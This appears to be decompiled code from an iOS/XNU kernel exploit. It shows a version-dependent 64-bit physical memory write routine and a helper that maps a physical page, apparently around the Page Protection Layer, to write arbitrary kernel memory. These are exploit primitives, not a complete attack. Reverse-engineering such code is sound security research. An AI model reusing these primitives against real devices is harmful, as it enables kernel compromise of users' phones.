//----- (000000000002B464) ----------------------------------------------------
__int64 __fastcall physwrite64_maybe(struct_krwCtx *krwCtx, unsigned __int64 paddr, __int64 value_1)
{
  __int64 value; // [xsp+8h] [xbp-8h] BYREF

  value = value_1;
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
    return physwritebuf_direct_mapped(krwCtx, paddr, &value, 8u, 0);
  else
    return dmaFail_physwritebuf_ppl(krwCtx, paddr, &value, 8u);
}

//----- (000000000002B4C8) ----------------------------------------------------
__int64 __fastcall dmaFail_physwritebuf_ppl(struct_krwCtx *krwCtx, __int64 paddr, uint64_t *data, unsigned int size)
{
  vm_size_t v4; // x19
  __int64 result; // x0
  vm_size_t v9; // x23
  __int64 v10; // x8
  void *v11; // x1
  void *__dst; // [xsp+8h] [xbp-38h] BYREF

  __dst = 0;
  v4 = vm_page_size;
  if ( paddr + (unsigned __int64)size > (-(__int64)vm_page_size & paddr) + vm_page_size )
    return 708609;
  v9 = vm_page_mask;
  result = physmap_maybe(krwCtx, (vm_address_t *)&__dst, vm_page_size, paddr);
  if ( !(uint32_t)result )
  {
    v10 = v9 & paddr;
    if ( size == 8 )
    {
      v11 = __dst;
      *(uint64_t *)((char *)__dst + v10) = *data;
    }
    else if ( size == 4 )
    {
      v11 = __dst;
      *(uint32_t *)((char *)__dst + v10) = *(uint32_t *)data;
    }
    else
    {
      memcpy(__dst, data, size);
      v11 = __dst;
    }
    vm_deallocate(mach_task_self_, (vm_address_t)v11, v4);
    return 0;
  }
  return result;
}

